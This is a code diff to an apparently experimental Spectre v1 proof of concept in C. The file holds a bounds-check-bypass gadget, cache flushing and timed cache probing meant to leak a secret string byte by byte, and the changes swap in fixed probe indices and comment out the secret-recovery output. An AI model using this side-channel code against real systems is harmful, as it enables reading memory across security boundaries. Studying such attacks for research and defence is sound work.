@@ -8,7 +8,6 @@
 #define STRIDE 4096
 #define RELOAD_BUF_SIZE STRIDE * 256
 #define ITER 1024
-
 #define NOPS(n) \
     asm volatile( \
         ".rept %0\n" \
@@ -17,11 +16,10 @@
         :: "i" (n) \
     )
 
-
 unsigned int size = 16;
 uint8_t fake_buffer[16] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
 uint8_t *reloadbuffer;
-char *secret = "_speculation_execute_";
+char *secret = "11";
 unsigned int *index_p1 = &size;
 unsigned char aligned_buffer1[4096];
 unsigned int **index_p2 = &index_p1;
@@ -34,13 +32,15 @@ volatile uint8_t pick = 0;
 uint64_t counter = 0;
 
 void spectre_v1( size_t index) {
-	size = 16;
-	pick = data;
-	NOPS(500);
-	if (index < size)
+	
+	pick = reloadbuffer[data];
+	
+	if (index < size) //long latency
 	{	
 		
-		pick = reloadbuffer[fake_buffer[index]<< 12];
+		
+		pick = reloadbuffer[0x88 << 12];
+		pick = reloadbuffer[size << 12];
 	}
 }
 
@@ -78,11 +78,11 @@ void leak(size_t target, uint8_t *byte) {
 			probe_addr = ((j % random_int) - 1) & 0xFFFFFFFFFFFFFF00; 
 			probe_addr = (probe_addr | (probe_addr >> 8)); 
 			probe_addr = train_index ^ (probe_addr & (target ^ train_index));
-		//	cacheflush(&size);
+			cacheflush(&size);
 			cacheflush(&data);
-		//	cacheflush(&index_p1);
-		//	cacheflush(&index_p2);
-			size = 16;
+//			cacheflush(&index_p1);
+//			cacheflush(&index_p2);
+//			cacheflush(&index_p3);
 			for(volatile int z = 0; z < 100; z++){
 			}
 
@@ -98,17 +98,22 @@ void leak(size_t target, uint8_t *byte) {
 			if (measured_clock <= 160 && index != fake_buffer[tries % size])
 				results[index]++; 
 		}
-		max = results[0];
-		for(int m = 0; m < 256; m++){
-			if(results[m] >= max){
-				max = results[m];
-				hit = m;
-			}
-		}
+//		max = results[0];
+//		for(int m = 0; m < 256; m++){
+//			if(results[m] >= max){
+//				max = results[m];
+//				hit = m;
+//			}
+//		}
 
 
 	}
-	printf("cache hit: %c, %x\n", (uint8_t)hit, hit);
+//	for(int i = 0; i < 256; i++){
+//		printf("%x: %d\n", i, results[i]);
+//	}
+	printf("%x: %d\n", 0x88, results[0x88]);
+	printf("%x: %d\n", 0x10, results[0x10]);
+	//printf("cache hit: %c, %x\n", (uint8_t)hit, hit);
 	*byte = (uint8_t)hit;
 }
 
@@ -131,12 +136,12 @@ int main(int argc, const char * * argv) {
 
 	for(int i = 0; i < secret_len; i++)
 	{
-		printf("ADDR: %p\t", (void *)offset + i);
+//		printf("ADDR: %p\t", (void *)offset + i);
 		leak(offset + i, &byte);
 		leaked[i] = byte;
 	}
 
-	printf("Leaked secret: \n");
+//	printf("Leaked secret: \n");
 	for(int i = 0; i < secret_len; i++){
 		printf("%c", leaked[i]);
 	}
